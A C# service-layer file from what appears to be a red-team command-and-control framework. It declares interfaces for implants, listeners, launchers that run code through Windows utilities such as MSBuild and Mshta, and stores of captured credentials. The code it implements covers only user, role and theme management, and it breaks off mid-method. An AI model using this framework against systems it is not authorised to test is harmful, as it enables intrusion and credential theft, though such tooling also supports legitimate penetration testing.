// Author: Ryan Cobb (@cobbr_io)
// Project: RedWolf (https://github.com/cobbr/RedWolf)
// License: GNU GPLv3

using System;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Security.Claims;
using System.Collections.Generic;
using System.Collections.Concurrent;
using System.Text.RegularExpressions;

using Microsoft.Extensions.Configuration;
using Microsoft.EntityFrameworkCore;
using Microsoft.AspNetCore.Identity;
using Microsoft.CodeAnalysis;

using Encrypt = RedWolf.Core.Encryption;
using RedWolf.Models;
using RedWolf.Models.RedWolf;
using RedWolf.Models.Listeners;
using RedWolf.Models.Launchers;
using RedWolf.Models.Grawls;
using RedWolf.Models.Indicators;

namespace RedWolf.Core
{
    public interface IRedWolfUserService
    {
        Task<IEnumerable<RedWolfUser>> GetUsers();
        Task<RedWolfUser> GetUser(string userId);
        Task<RedWolfUser> GetUserByUsername(string username);
        Task<RedWolfUser> GetCurrentUser(ClaimsPrincipal principal);
        Task<RedWolfUserLoginResult> Login(RedWolfUserLogin login);
        Task<RedWolfUser> CreateUserVerify(ClaimsPrincipal principal, RedWolfUserRegister register);
        Task<RedWolfUser> CreateUser(RedWolfUserLogin login);
        Task<RedWolfUser> EditUser(RedWolfUser currentUser);
        Task<RedWolfUser> EditUserPassword(RedWolfUser currentUser, RedWolfUserLogin user);
        Task DeleteUser(string userId);
    }

    public interface IIdentityRoleService
    {
        Task<IEnumerable<IdentityRole>> GetRoles();
        Task<IdentityRole> GetRole(string roleId);
        Task<IdentityRole> GetRoleByName(string rolename);
    }

    public interface IIdentityUserRoleService
    {
        Task<IEnumerable<IdentityUserRole<string>>> GetUserRoles();
        Task<IEnumerable<IdentityUserRole<string>>> GetUserRolesForUser(string userId);
        Task<IdentityUserRole<string>> GetUserRole(string userId, string roleId);
        Task<IdentityUserRole<string>> CreateUserRole(string userId, string roleId);
        Task DeleteUserRole(string userId, string roleId);
    }

    public interface IThemeService
    {
        Task<IEnumerable<Theme>> GetThemes();
        Task<Theme> GetTheme(int id);
        Task<Theme> CreateTheme(Theme theme);
        Task<Theme> EditTheme(Theme theme);
        Task DeleteTheme(int id);
    }

    public interface IEventService
    {
        Task<IEnumerable<Event>> GetEvents();
        Task<Event> GetEvent(int eventId);
        Task<long> GetEventTime();
        Task<IEnumerable<Event>> GetEventsAfter(long fromdate);
        Task<IEnumerable<Event>> GetEventsRange(long fromdate, long todate);
        Task<Event> CreateEvent(Event anEvent);
        Task<IEnumerable<Event>> CreateEvents(params Event[] events);
        Task<IEnumerable<DownloadEvent>> GetDownloadEvents();
        Task<DownloadEvent> GetDownloadEvent(int eventId);
        Task<string> GetDownloadContent(int eventId);
        Task<DownloadEvent> CreateDownloadEvent(DownloadEvent downloadEvent);
        Task<IEnumerable<ScreenshotEvent>> GetScreenshotEvents();
        Task<ScreenshotEvent> GetScreenshotEvent(int eventId);
        Task<string> GetScreenshotContent(int eventId);
        Task<ScreenshotEvent> CreateScreenshotEvent(ScreenshotEvent screenshotEvent);
    }

    public interface IImplantTemplateService
    {
        Task<IEnumerable<ImplantTemplate>> GetImplantTemplates();
        Task<ImplantTemplate> GetImplantTemplate(int id);
        Task<ImplantTemplate> GetImplantTemplateByName(string name);
        Task<ImplantTemplate> CreateImplantTemplate(ImplantTemplate template);
        Task<IEnumerable<ImplantTemplate>> CreateImplantTemplates(params ImplantTemplate[] templates);
        Task<ImplantTemplate> EditImplantTemplate(ImplantTemplate template);
        Task DeleteImplantTemplate(int id);
    }

    public interface IGrawlService
    {
        Task<IEnumerable<Grawl>> GetGrawls();
        Task<Grawl> GetGrawl(int grawlId);
        Task<Grawl> GetGrawlByName(string name);
        Task<Grawl> GetGrawlByANOTHERID(string anotherid);
        Task<Grawl> GetGrawlByOriginalServerANOTHERID(string serveranotherid);
        Task<bool> IsGrawlLost(Grawl g);
        Task<List<string>> GetPathToChildGrawl(int grawlId, int childId);
        Task<Grawl> GetOutboundGrawl(int grawlId);
        Task<Grawl> CreateGrawl(Grawl grawl);
        Task<IEnumerable<Grawl>> CreateGrawls(params Grawl[] grawls);
        Task<Grawl> EditGrawl(Grawl grawl, RedWolfUser user);
        Task DeleteGrawl(int grawlId);
        Task<List<string>> GetCommandSuggestionsForGrawl(Grawl grawl);
        Task<byte[]> CompileGrawlStagerCode(int id, Launcher launcher);
        Task<byte[]> CompileGrawlExecutorCode(int id, OutputKind outputKind = OutputKind.DynamicallyLinkedLibrary, bool Compress = false);
        Task<GrawlCommand> InteractGrawl(int GrawlId, string UserId, string UserInput);
    }

    public interface IReferenceAssemblyService
    {
        Task<IEnumerable<ReferenceAssembly>> GetReferenceAssemblies();
        Task<IEnumerable<ReferenceAssembly>> GetDefaultNet35ReferenceAssemblies();
        Task<IEnumerable<ReferenceAssembly>> GetDefaultNet40ReferenceAssemblies();
        Task<ReferenceAssembly> GetReferenceAssembly(int id);
        Task<ReferenceAssembly> GetReferenceAssemblyByName(string name, Common.DotNetVersion version);
        Task<ReferenceAssembly> CreateReferenceAssembly(ReferenceAssembly assembly);
        Task<IEnumerable<ReferenceAssembly>> CreateReferenceAssemblies(params ReferenceAssembly[] assemblies);
        Task<ReferenceAssembly> EditReferenceAssembly(ReferenceAssembly assembly);
        Task DeleteReferenceAssembly(int id);
    }

    public interface IEmbeddedResourceService
    {
        Task<IEnumerable<EmbeddedResource>> GetEmbeddedResources();
        Task<EmbeddedResource> GetEmbeddedResource(int id);
        Task<EmbeddedResource> GetEmbeddedResourceByName(string name);
        Task<EmbeddedResource> CreateEmbeddedResource(EmbeddedResource resource);
        Task<IEnumerable<EmbeddedResource>> CreateEmbeddedResources(params EmbeddedResource[] resources);
        Task<EmbeddedResource> EditEmbeddedResource(EmbeddedResource resource);
        Task DeleteEmbeddedResource(int id);
    }

    public interface IReferenceSourceLibraryService
    {
        Task<IEnumerable<ReferenceSourceLibrary>> GetReferenceSourceLibraries();
        Task<ReferenceSourceLibrary> GetReferenceSourceLibrary(int id);
        Task<ReferenceSourceLibrary> GetReferenceSourceLibraryByName(string name);
        Task<ReferenceSourceLibrary> CreateReferenceSourceLibrary(ReferenceSourceLibrary library);
        Task<IEnumerable<ReferenceSourceLibrary>> CreateReferenceSourceLibraries(params ReferenceSourceLibrary[] libraries);
        Task<ReferenceSourceLibrary> EditReferenceSourceLibrary(ReferenceSourceLibrary library);
        Task DeleteReferenceSourceLibrary(int id);
    }

    public interface IGrawlTaskOptionService
    {
        Task<GrawlTaskOption> EditGrawlTaskOption(GrawlTaskOption option);
        Task<GrawlTaskOption> CreateGrawlTaskOption(GrawlTaskOption option);
        Task<IEnumerable<GrawlTaskOption>> CreateGrawlTaskOptions(params GrawlTaskOption[] options);
    }

    public interface IGrawlTaskAuthorService
    {
        Task<IEnumerable<GrawlTaskAuthor>> GetGrawlTaskAuthors();
        Task<GrawlTaskAuthor> GetGrawlTaskAuthor(int id);
        Task<GrawlTaskAuthor> GetGrawlTaskAuthorByName(string Name);
        Task<GrawlTaskAuthor> CreateGrawlTaskAuthor(GrawlTaskAuthor author);
        Task<GrawlTaskAuthor> EditGrawlTaskAuthor(GrawlTaskAuthor author);
    }

    public interface IGrawlTaskService : IReferenceAssemblyService, IEmbeddedResourceService, IReferenceSourceLibraryService,
        IGrawlTaskOptionService, IGrawlTaskAuthorService
    {
        Task<IEnumerable<GrawlTask>> GetGrawlTasks();
        Task<IEnumerable<GrawlTask>> GetGrawlTasksForGrawl(int grawlId);
        Task<GrawlTask> GetGrawlTask(int id);
        Task<GrawlTask> GetGrawlTaskByName(string name, Common.DotNetVersion version = Common.DotNetVersion.Net35);
        Task<GrawlTask> CreateGrawlTask(GrawlTask task);
        Task<IEnumerable<GrawlTask>> CreateGrawlTasks(params GrawlTask[] tasks);
        Task<GrawlTask> EditGrawlTask(GrawlTask task);
        Task DeleteGrawlTask(int taskId);
        Task<string> ParseParametersIntoTask(GrawlTask task, List<ParsedParameter> parameters);
    }

    public interface IGrawlCommandService
    {
        Task<IEnumerable<GrawlCommand>> GetGrawlCommands();
        Task<IEnumerable<GrawlCommand>> GetGrawlCommandsForGrawl(int grawlId);
        Task<GrawlCommand> GetGrawlCommand(int id);
        Task<GrawlCommand> CreateGrawlCommand(GrawlCommand command);
        Task<IEnumerable<GrawlCommand>> CreateGrawlCommands(params GrawlCommand[] commands);
        Task<GrawlCommand> EditGrawlCommand(GrawlCommand command);
        Task DeleteGrawlCommand(int id);
    }

    public interface ICommandOutputService
    {
        Task<IEnumerable<CommandOutput>> GetCommandOutputs();
        Task<CommandOutput> GetCommandOutput(int commandOutputId);
        Task<CommandOutput> CreateCommandOutput(CommandOutput output);
        Task<IEnumerable<CommandOutput>> CreateCommandOutputs(params CommandOutput[] outputs);
        Task<CommandOutput> EditCommandOutput(CommandOutput output);
        Task DeleteCommandOutput(int id);
    }

    public interface IGrawlTaskingService
    {
        Task<IEnumerable<GrawlTasking>> GetGrawlTaskings();
        Task<IEnumerable<GrawlTasking>> GetGrawlTaskingsForGrawl(int grawlId);
        Task<IEnumerable<GrawlTasking>> GetUninitializedGrawlTaskingsForGrawl(int grawlId);
        Task<IEnumerable<GrawlTasking>> GetGrawlTaskingsSearch(int grawlId);
        Task<GrawlTasking> GetGrawlTasking(int taskingId);
        Task<GrawlTasking> GetGrawlTaskingByName(string taskingName);
        Task<GrawlTasking> CreateGrawlTasking(GrawlTasking tasking);
        Task<IEnumerable<GrawlTasking>> CreateGrawlTaskings(params GrawlTasking[] taskings);
        Task<GrawlTasking> EditGrawlTasking(GrawlTasking tasking);
        Task DeleteGrawlTasking(int taskingId);
    }

    public interface ICredentialService
    {
        Task<IEnumerable<CapturedCredential>> GetCredentials();
        Task<IEnumerable<CapturedPasswordCredential>> GetPasswordCredentials();
        Task<IEnumerable<CapturedHashCredential>> GetHashCredentials();
        Task<IEnumerable<CapturedTicketCredential>> GetTicketCredentials();
        Task<CapturedCredential> GetCredential(int credentialId);
        Task<CapturedPasswordCredential> GetPasswordCredential(int credentialId);
        Task<CapturedHashCredential> GetHashCredential(int credentialId);
        Task<CapturedTicketCredential> GetTicketCredential(int credentialId);
        Task<CapturedPasswordCredential> CreatePasswordCredential(CapturedPasswordCredential credential);
        Task<CapturedHashCredential> CreateHashCredential(CapturedHashCredential credential);
        Task<CapturedTicketCredential> CreateTicketCredential(CapturedTicketCredential credential);
        Task<IEnumerable<CapturedCredential>> CreateCredentials(params CapturedCredential[] credentials);
        Task<CapturedPasswordCredential> EditPasswordCredential(CapturedPasswordCredential credential);
        Task<CapturedHashCredential> EditHashCredential(CapturedHashCredential credential);
        Task<CapturedTicketCredential> EditTicketCredential(CapturedTicketCredential credential);
        Task DeleteCredential(int credentialId);
    }

    public interface IIndicatorService
    {
        Task<IEnumerable<Indicator>> GetIndicators();
        Task<IEnumerable<FileIndicator>> GetFileIndicators();
        Task<IEnumerable<NetworkIndicator>> GetNetworkIndicators();
        Task<IEnumerable<TargetIndicator>> GetTargetIndicators();
        Task<Indicator> GetIndicator(int indicatorId);
        Task<FileIndicator> GetFileIndicator(int indicatorId);
        Task<NetworkIndicator> GetNetworkIndicator(int indicatorId);
        Task<TargetIndicator> GetTargetIndicator(int indicatorId);
        Task<Indicator> CreateIndicator(Indicator indicator);
        Task<IEnumerable<Indicator>> CreateIndicators(params Indicator[] indicators);
        Task<Indicator> EditIndicator(Indicator indicator);
        Task DeleteIndicator(int indicatorId);
    }

    public interface IListenerTypeService
    {
        Task<IEnumerable<ListenerType>> GetListenerTypes();
        Task<ListenerType> GetListenerType(int listenerTypeId);
        Task<ListenerType> GetListenerTypeByName(string name);
    }

    public interface IListenerService : IListenerTypeService
    {
        Task<IEnumerable<Listener>> GetListeners();
        Task<Listener> GetListener(int listenerId);
        Task<Listener> EditListener(Listener listener);
        Task StartListener(int listenerId);
        Task DeleteListener(int listenerId);
        Task<IEnumerable<HttpListener>> GetHttpListeners();
        Task<IEnumerable<BridgeListener>> GetBridgeListeners();
        Task<HttpListener> GetHttpListener(int listenerId);
        Task<BridgeListener> GetBridgeListener(int listenerId);
        Task<HttpListener> CreateHttpListener(HttpListener listener);
        Task<BridgeListener> CreateBridgeListener(BridgeListener listener);
        Task<IEnumerable<Listener>> CreateListeners(params Listener[] entities);
        Task<HttpListener> EditHttpListener(HttpListener listener);
        Task<BridgeListener> EditBridgeListener(BridgeListener listener);
    }

    public interface IProfileService
    {
        Task<IEnumerable<Profile>> GetProfiles();
        Task<Profile> GetProfile(int profileId);
        Task<Profile> CreateProfile(Profile profile, RedWolfUser currentUser);
        Task<Profile> EditProfile(Profile profile, RedWolfUser currentUser);
        Task DeleteProfile(int id);
        Task<IEnumerable<HttpProfile>> GetHttpProfiles();
        Task<IEnumerable<BridgeProfile>> GetBridgeProfiles();
        Task<HttpProfile> GetHttpProfile(int profileId);
        Task<BridgeProfile> GetBridgeProfile(int profileId);
        Task<HttpProfile> CreateHttpProfile(HttpProfile profile, RedWolfUser currentUser);
        Task<BridgeProfile> CreateBridgeProfile(BridgeProfile profile, RedWolfUser currentUser);
        Task<IEnumerable<Profile>> CreateProfiles(params Profile[] profiles);
        Task<HttpProfile> EditHttpProfile(HttpProfile profile, RedWolfUser currentUser);
        Task<BridgeProfile> EditBridgeProfile(BridgeProfile profile, RedWolfUser currentUser);
    }

    public interface IHostedFileService
    {
        Task<IEnumerable<HostedFile>> GetHostedFiles();
        Task<HostedFile> GetHostedFile(int hostedFileId);
        Task<IEnumerable<HostedFile>> GetHostedFilesForListener(int listenerId);
        Task<HostedFile> GetHostedFileForListener(int listenerId, int hostedFileId);
        Task<HostedFile> CreateHostedFile(HostedFile file);
        Task<IEnumerable<HostedFile>> CreateHostedFiles(params HostedFile[] files);
        Task<HostedFile> EditHostedFile(int listenerId, HostedFile file);
        Task DeleteHostedFile(int listenerId, int hostedFileId);
    }

    public interface ILauncherService
    {
        Task<IEnumerable<Launcher>> GetLaunchers();
        Task<Launcher> GetLauncher(int id);
        Task<BinaryLauncher> GetBinaryLauncher();
        Task<BinaryLauncher> GenerateBinaryLauncher();
        Task<BinaryLauncher> GenerateBinaryHostedLauncher(HostedFile file);
        Task<BinaryLauncher> EditBinaryLauncher(BinaryLauncher launcher);
        Task<ServiceBinaryLauncher> GetServiceBinaryLauncher();
        Task<ServiceBinaryLauncher> GenerateServiceBinaryLauncher();
        Task<ServiceBinaryLauncher> GenerateServiceBinaryHostedLauncher(HostedFile file);
        Task<ServiceBinaryLauncher> EditServiceBinaryLauncher(ServiceBinaryLauncher launcher);
        Task<ShellCodeLauncher> GetShellCodeLauncher();
        Task<ShellCodeLauncher> GenerateShellCodeLauncher();
        Task<ShellCodeLauncher> GenerateShellCodeHostedLauncher(HostedFile file);
        Task<ShellCodeLauncher> EditShellCodeLauncher(ShellCodeLauncher launcher);
        Task<PowerShellLauncher> GetPowerShellLauncher();
        Task<PowerShellLauncher> GeneratePowerShellLauncher();
        Task<PowerShellLauncher> GeneratePowerShellHostedLauncher(HostedFile file);
        Task<PowerShellLauncher> EditPowerShellLauncher(PowerShellLauncher launcher);
        Task<MSBuildLauncher> GetMSBuildLauncher();
        Task<MSBuildLauncher> GenerateMSBuildLauncher();
        Task<MSBuildLauncher> GenerateMSBuildHostedLauncher(HostedFile file);
        Task<MSBuildLauncher> EditMSBuildLauncher(MSBuildLauncher launcher);
        Task<InstallUtilLauncher> GetInstallUtilLauncher();
        Task<InstallUtilLauncher> GenerateInstallUtilLauncher();
        Task<InstallUtilLauncher> GenerateInstallUtilHostedLauncher(HostedFile file);
        Task<InstallUtilLauncher> EditInstallUtilLauncher(InstallUtilLauncher launcher);
        Task<WmicLauncher> GetWmicLauncher();
        Task<WmicLauncher> GenerateWmicLauncher();
        Task<WmicLauncher> GenerateWmicHostedLauncher(HostedFile file);
        Task<WmicLauncher> EditWmicLauncher(WmicLauncher launcher);
        Task<Regsvr32Launcher> GetRegsvr32Launcher();
        Task<Regsvr32Launcher> GenerateRegsvr32Launcher();
        Task<Regsvr32Launcher> GenerateRegsvr32HostedLauncher(HostedFile file);
        Task<Regsvr32Launcher> EditRegsvr32Launcher(Regsvr32Launcher launcher);
        Task<MshtaLauncher> GetMshtaLauncher();
        Task<MshtaLauncher> GenerateMshtaLauncher();
        Task<MshtaLauncher> GenerateMshtaHostedLauncher(HostedFile file);
        Task<MshtaLauncher> EditMshtaLauncher(MshtaLauncher launcher);
        Task<CscriptLauncher> GetCscriptLauncher();
        Task<CscriptLauncher> GenerateCscriptLauncher();
        Task<CscriptLauncher> GenerateCscriptHostedLauncher(HostedFile file);
        Task<CscriptLauncher> EditCscriptLauncher(CscriptLauncher launcher);
        Task<WscriptLauncher> GetWscriptLauncher();
        Task<WscriptLauncher> GenerateWscriptLauncher();
        Task<WscriptLauncher> GenerateWscriptHostedLauncher(HostedFile file);
        Task<WscriptLauncher> EditWscriptLauncher(WscriptLauncher launcher);
    }

    public interface IRedWolfService : IRedWolfUserService, IIdentityRoleService, IIdentityUserRoleService, IThemeService,
        IEventService, IImplantTemplateService, IGrawlService, IGrawlTaskService,
        IGrawlCommandService, ICommandOutputService, IGrawlTaskingService,
        ICredentialService, IIndicatorService, IListenerService, IProfileService, IHostedFileService, ILauncherService
    {
        Task<IEnumerable<T>> CreateEntities<T>(params T[] entities);
        void DisposeContext();
    }

    public interface IRemoteRedWolfService : IRedWolfUserService, IIdentityRoleService, IIdentityUserRoleService, IThemeService,
        IEventService, IImplantTemplateService, IGrawlService, IGrawlTaskService,
        IGrawlCommandService, ICommandOutputService, IGrawlTaskingService,
        ICredentialService, IIndicatorService, IListenerService, IProfileService, IHostedFileService, ILauncherService
    {

    }


    public class RedWolfService : IRedWolfService
    {
        protected readonly DbContextOptions<RedWolfContext> _options;
        protected RedWolfContext _context;
        protected readonly INotificationService _notifier;
        protected readonly UserManager<RedWolfUser> _userManager;
        protected readonly SignInManager<RedWolfUser> _signInManager;
        protected readonly IConfiguration _configuration;
        protected readonly ConcurrentDictionary<int, CancellationTokenSource> _cancellationTokens;

        public RedWolfService(DbContextOptions<RedWolfContext> options, RedWolfContext context, INotificationService notifier,
            UserManager<RedWolfUser> userManager, SignInManager<RedWolfUser> signInManager,
            IConfiguration configuration, ConcurrentDictionary<int, CancellationTokenSource> cancellationTokens)
        {
            _options = options;
            _context = context;
            _notifier = notifier;
            _userManager = userManager;
            _signInManager = signInManager;
            _configuration = configuration;
            _cancellationTokens = cancellationTokens;
        }

        public void DisposeContext()
        {
            _context.Dispose();
            _context = new RedWolfContext(_options);
        }

        public async Task<IEnumerable<T>> CreateEntities<T>(params T[] entities)
        {
            foreach (T entity in entities)
            {
                await _context.AddAsync(entity);
            }
            await _context.SaveChangesAsync();
            return entities;
        }

        #region RedWolfUser Actions
        public async Task<IEnumerable<RedWolfUser>> GetUsers()
        {
            return await _context.Users
                .Include(U => U.Theme)
                .ToListAsync();
        }

        public async Task<RedWolfUser> GetUser(string userId)
        {
            RedWolfUser user = await _context.Users
                .Include(U => U.Theme)
                .FirstOrDefaultAsync(U => U.Id == userId);
            if (user == null)
            {
                throw new ControllerNotFoundException($"NotFound - RedWolfUser with id: {userId}");
            }
            return user;
        }

        public async Task<RedWolfUser> GetUserByUsername(string username)
        {
            RedWolfUser user = await _context.Users
                .Include(U => U.Theme)
                .FirstOrDefaultAsync(U => U.UserName == username);
            if (user == null)
            {
                throw new ControllerNotFoundException($"NotFound - RedWolfUser with Username: {username}");
            }
            return user;
        }

        public async Task<RedWolfUser> GetCurrentUser(ClaimsPrincipal principal)
        {
            RedWolfUser user = await _userManager.GetUserAsync(principal);
            if (user == null)
            {
                throw new ControllerNotFoundException($"NotFound - Could not identify current username");
            }
            return await this.GetUser(user.Id);
        }

        public async Task<RedWolfUserLoginResult> Login(RedWolfUserLogin login)
        {
            SignInResult result = await _signInManager.PasswordSignInAsync(login.UserName, login.Password, false, false);
            if (!result.Succeeded)
            {
                return new RedWolfUserLoginResult { Success = false, RedWolfToken = "" };
            }
            RedWolfUser user = await _context.Users
                .Include(U => U.Theme)
                .FirstOrDefaultAsync(U => U.UserName == login.UserName);
            if (user == null)
            {
                throw new ControllerNotFoundException($"NotFound - User with username: {login.UserName}");
            }
            List<string> userRoles = await _context.UserRoles.Where(UR => UR.UserId == user.Id).Select(UR => UR.RoleId).ToListAsync();
            List<string> roles = await _context.Roles.Where(R => userRoles.Contains(R.Id)).Select(R => R.Name).ToListAsync();

            string token = Utilities.GenerateJwtToken(
                login.UserName, user.Id, roles.ToArray(),
                _configuration["JwtKey"], _configuration["JwtIssuer"],
                _configuration["JwtAudience"], _configuration["JwtExpireDays"]
            );
            return new RedWolfUserLoginResult { Success = true, RedWolfToken = token };
        }

        public async Task<RedWolfUser> CreateUserVerify(ClaimsPrincipal principal, RedWolfUserRegister register)
        {
            if (_userManager.Users.Any() && !principal.Identity.IsAuthenticated)
            {
                throw new ControllerUnauthorizedException($"Unauthorized - Must be signed in to register a new user.");
            }
            if (_userManager.Users.Any() && !principal.IsInRole("Administrator"))
            {
                throw new ControllerUnauthorizedException($"Unauthorized - Must be signed in as an Administrator to register a new user.");
            }
            if (register.Password != register.ConfirmPassword)
            {
                throw new ControllerBadRequestException($"BadRequest - Password does not match ConfirmPassword.");
            }
            RedWolfUser created = await CreateUser(new RedWolfUserLogin { UserName = register.UserName, Password = register.Password });
            await _userManager.AddToRoleAsync(created, "User");
            if (!_userManager.Users.Any())
            {
                await _signInManager.PasswordSignInAsync(register.UserName, register.Password, true, lockoutOnFailure: false);
            }
            // _notifier.OnCreateRedWolfUser?.Invoke(this, created);
            return created;
        }

        public async Task<RedWolfUser> CreateUser(RedWolfUserLogin login)
        {
            RedWolfUser user = new RedWolfUser { UserName = login.UserName };
            IdentityResult userResult = await _userManager.CreateAsync(user, login.Password);
            if (!userResult.Succeeded)
            {
                List<IdentityError> errors = userResult.Errors.ToList();
                string ErrorMessage = $"BadRequest - Could not create RedWolfUser: {user.UserName}";
                foreach (IdentityError error in userResult.Errors)
                {
                    ErrorMessage += Environment.NewLine + error.Description;
                }
                throw new ControllerBadRequestException(ErrorMessage);
            }

            if (!_userManager.Users.Any())
            {
                await _userManager.AddToRoleAsync(user, "Administrator");
            }

            RedWolfUser savedUser = await _userManager.Users.FirstOrDefaultAsync(U => U.UserName == user.UserName);
            if (savedUser == null)
            {
                throw new ControllerNotFoundException($"NotFound - Could not find RedWolfUser with username: {user.UserName}");
            }
            string savedRoles = String.Join(",", await this.GetUserRolesForUser(savedUser.Id));

            DateTime eventTime = DateTime.UtcNow;
            Event userEvent = new Event
            {
                Time = eventTime,
                MessageHeader = "Created User",
                MessageBody = "User: " + savedUser.UserName + " with roles: " + savedRoles + " has been created!",
                Level = EventLevel.Info,
                Context = "Users"
            };
            await _context.Events.AddAsync(userEvent);
            // _notifier.OnCreateRedWolfUser(this, savedUser);
            await _notifier.NotifyCreateEvent(this, userEvent);
            return savedUser;
        }

        public async Task<RedWolfUser> EditUser(RedWolfUser user)
        {
            RedWolfUser matching_user = await _userManager.Users.FirstOrDefaultAsync(U => U.Id == user.Id);
            if (matching_user == null)
            {
                throw new ControllerNotFoundException($"NotFound - RedWolfUser with id: {user.Id}");
            }
            matching_user.ThemeId = user.ThemeId;
            IdentityResult result = await _userManager.UpdateAsync(matching_user);
            if (!result.Succeeded)
            {
                throw new ControllerBadRequestException($"BadRequest - Could not edit RedWolfUser with id: {user.Id}");
            }
            // await _context.SaveChangesAsync();
            await _notifier.NotifyEditRedWolfUser(this, matching_user);
            return matching_user;
        }

        public async Task<RedWolfUser> EditUserPassword(RedWolfUser currentUser, RedWolfUserLogin user)
        {
            RedWolfUser matching_user = await _userManager.Users.FirstOrDefaultAsync(U => U.UserName == user.UserName);
            if (matching_user == null)
            {
                throw new ControllerNotFoundException($"NotFound - RedWolfUser with username: {user.UserName}");
            }
            if (currentUser.UserName != matching_user.UserName)
            {
                throw new ControllerBadRequestException($"BadRequest - Current user: {currentUser.UserName} cannot change password of user: {user.Password}");
            }
            matching_user.PasswordHash = _userManager.PasswordHasher.HashPassword(matching_user, user.Password);
            IdentityResult result = await _userManager.UpdateAsync(matching_user);
            if (!result.Succeeded)
            {
                throw new ControllerBadRequestException($"BadRequest - Could not set new password for RedWolfUser with username: {user.UserName}");
            }
            // await _context.SaveChangesAsync();
            await _notifier.NotifyEditRedWolfUser(this, matching_user);
            return matching_user;
        }

        public async Task DeleteUser(string userId)
        {
            RedWolfUser user = await this.GetUser(userId);
            if (await this.IsAdmin(user) && this.GetAdminCount() == 1)
            {
                string ErrorMessage = $"BadRequest - Could not delete RedWolfUser with id: {userId}";
                ErrorMessage += "Can't delete the last Administrative user.";
                throw new ControllerBadRequestException(ErrorMessage);
            }
            _context.Users.Remove(user);
            await _context.SaveChangesAsync();
            await _notifier.NotifyDeleteRedWolfUser(this, user.Id);
        }

        private IQueryable<RedWolfUser> GetAdminUsers()
        {
            return from users in _context.Users
                   join userroles in _context.UserRoles on users.Id equals userroles.UserId
                   join roles in _context.Roles on userroles.RoleId equals roles.Id
                   where roles.Name == "Administrator"
                   select users;
        }

        private async Task<bool> IsAdmin(RedWolfUser user)
        {
            return await GetAdminUsers().Select(U => U.UserName).ContainsAsync(user.UserName);
        }

        private int GetAdminCount()
        {
            return GetAdminUsers().Count();
        }
        #endregion

        #region Role Actions
        public async Task<IEnumerable<IdentityRole>> GetRoles()
        {
            return await _context.Roles.ToListAsync();
        }

        public async Task<IdentityRole> GetRole(string roleId)
        {
            IdentityRole role = await _context.Roles.FirstOrDefaultAsync(R => R.Id == roleId);
            if (role == null)
            {
                throw new ControllerNotFoundException($"NotFound - Could not find Role with id: {roleId}");
            }
            return role;
        }

        public async Task<IdentityRole> GetRoleByName(string rolename)
        {
            IdentityRole role = await _context.Roles.FirstOrDefaultAsync(R => R.Name == rolename);
            if (role == null)
            {
                throw new ControllerNotFoundException($"NotFound - Could not find Role with name: {rolename}");
            }
            return role;
        }
        #endregion

        #region UserRole Actions
        public async Task<IEnumerable<IdentityUserRole<string>>> GetUserRoles()
        {
            return await _context.UserRoles.ToListAsync();
        }

        public async Task<IEnumerable<IdentityUserRole<string>>> GetUserRolesForUser(string userId)
        {
            return await _context.UserRoles.Where(UR => UR.UserId == userId).ToListAsync();
        }

        public async Task<IdentityUserRole<string>> GetUserRole(string userId, string roleId)
        {
            IdentityUserRole<string> userRole = await _context.UserRoles.FirstOrDefaultAsync(UR => UR.UserId == userId && UR.RoleId == roleId);
            if (userRole == null)
            {
                throw new ControllerNotFoundException($"NotFound - Could not find UserRole with user id: {userId} and role id: {roleId}");
            }
            return userRole;
        }

        public async Task<IdentityUserRole<string>> CreateUserRole(string userId, string roleId)
        {
            RedWolfUser user = await _userManager.Users.FirstOrDefaultAsync(U => U.Id == userId);
            if (user == null)
            {
                throw new ControllerNotFoundException($"NotFound - RedWolfUser with id: {userId}");
            }
            IdentityRole role = await this.GetRole(roleId);
            IdentityUserRole<string> userRole = new IdentityUserRole<string>
            {
                UserId = user.Id,
                RoleId = role.Id
            };
            IdentityResult result = await _userManager.AddToRoleAsync(user, role.Name);
            if (!result.Succeeded)
            {
                string Errors = $"BadRequest - Could not add RedWolfUser: {user.UserName} to role: {role.Name}";
                foreach (var error in result.Errors)
                {
                    Errors += $"{Environment.NewLine}{error.Description} ({error.Code})";
                }
                throw new ControllerBadRequestException(Errors);
            }
            // _notifier.OnCreateIdentityUserRole(this, userRole);
            return userRole;
        }

        public async Task DeleteUserRole(string userId, string roleId)
        {
            RedWolfUser user = await this.GetUser(userId);
            IdentityRole role = await this.GetRole(roleId);
            IdentityRole adminRole = await this.GetRoleByName("Administrator");
            if (role == adminRole && _context.UserRoles.Where(UR => UR.RoleId == adminRole.Id).Count() == 1)
            {
                string ErrorMessage = $"BadRequest - Could not remove RedWolfUser with id: {userId} from Administrative role";
                ErrorMessage += "Can't remove the last Administrative user.";
                throw new ControllerBadRequestException(ErrorMessage);
            }
            IdentityUserRole<string> userRole = new IdentityUserRole<string>
            {
                UserId = user.Id,
                RoleId = role.Id
            };
            var entry = _context.UserRoles.Remove(userRole);
            if (entry.State != EntityState.Deleted)
            {
                throw new ControllerBadRequestException($"BadRequest - Could not remove role: {role.Name} from RedWolfUser: {user.UserName}");
            }
            await _context.SaveChangesAsync();
            // _notifier.OnDeleteIdentityUserRole(this, new Tuple<string, string>(user.Id, role.Id));
        }
        #endregion

        #region Theme Actions
        public async Task<IEnumerable<Theme>> GetThemes()
        {
            return await _context.Themes.ToListAsync();
        }

        public async Task<Theme> GetTheme(int themeId)
        {
            Theme theme = await _context.Themes.FirstOrDefaultAsync(T => T.Id == themeId);
            if (theme == null)
            {
                throw new ControllerNotFoundException($"NotFound - Theme with id: {themeId}");
            }
            return theme;
        }

        public async Task<Theme> CreateTheme(Theme theme)
        {
            await _context.Themes.AddAsync(theme);
            await _context.SaveChangesAsync();
            await _notifier.NotifyCreateTheme(this, theme);
            return await this.GetTheme(theme.Id);
        }

        public async Task<Theme> EditTheme(Theme theme)
        {
            Theme matchingTheme = await this.GetTheme(theme.Id);
            matchingTheme.Description = theme.Description;
            matchingTheme.Name = theme.Name;

            matchingTheme.BackgroundColor = theme.BackgroundColor;
            matchingTheme.BackgroundTextColor = theme.BackgroundTextColor;

            matchingTheme.PrimaryColor = theme.PrimaryColor;
            matchingTheme.PrimaryTextColor = theme.PrimaryTextColor;
            matchingTheme.PrimaryHighlightColor = theme.PrimaryHighlightColor;

            matchingTheme.SecondaryColor = theme.SecondaryColor;
            matchingTheme.SecondaryTextColor = theme.SecondaryTextColor;
            matchingTheme.SecondaryHighlightColor = theme.SecondaryHighlightColor;

            matchingTheme.TerminalColor = theme.TerminalColor;
            matchingTheme.TerminalTextColor = theme.TerminalTextColor;
